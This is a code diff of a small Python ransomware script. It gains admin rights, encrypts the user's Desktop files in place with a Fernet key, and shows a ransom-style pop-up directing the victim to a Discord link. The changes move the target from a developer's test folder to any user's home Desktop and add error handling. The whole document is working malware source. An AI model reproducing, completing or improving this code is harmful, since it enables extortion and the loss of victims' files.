@@ -6,7 +6,9 @@ import sys
 import requests
 from tkinter import messagebox
 
-
+def get_home_directory():
+    home = os.path.expanduser("~")
+    return home
 
 def run_as_admin():
     if sys.platform == 'win32':
@@ -20,8 +22,8 @@ def run_as_admin():
         sys.exit(1)
 
 
-#fld = "C:/Users/thoma/Desktop"
-fld = 'C:/Users/thoma/OneDrive/Bureau/pcr'
+fld = f"{get_home_directory()}Desktop"
+
 def generate_key():
     return Fernet.generate_key()
 
@@ -36,13 +38,16 @@ def save_key(key, key_file):
 
 
 def encrypt_file(key, input_file, output_file):
-    
+    try:
         cipher = Fernet(key)
         with open(input_file, 'rb') as f:
             data = f.read()
+        print(input_file)
         encrypted_data = cipher.encrypt(data)
         with open(input_file, 'wb') as f:
             f.write(encrypted_data)
+    except:
+        print("hihi1")
 
 
     
@@ -59,18 +64,16 @@ def encrypt_folder(key, input_folder, output_folder):
             else:
                 encrypt_file(key, s, d)
     except:
-        print("hihi")
+        print("hihi2")
 
 if __name__ == "__main__":
+    #les verification de et l'execution de tout les def 
     if ctypes.windll.shell32.IsUserAnAdmin() == 0:
         run_as_admin()
         key = generate_key()
         save_key(key, 'secret.key')
         encrypt_folder(key, fld, 'vrenc')
-        messagebox.showinfo("Decryption", "hey i am here to notify you\n your pc have been encrypted\n to decrypt go to https://discord.gg/HjFdfXuZ5g")
-        messagebox.showinfo("Decryption", "https://discord.gg/HjFdfXuZ5g")
+        messagebox.showinfo("Encryption", "hey i am here to notify you\n your pc have been encrypted\n to decrypt go to https://discord.gg/HjFdfXuZ5g")
+        messagebox.showinfo("Encryption", "https://discord.gg/HjFdfXuZ5g")
     else:
         print("Le script est déjà en cours d'exécution en tant qu'administrateur.")
-
-        
-
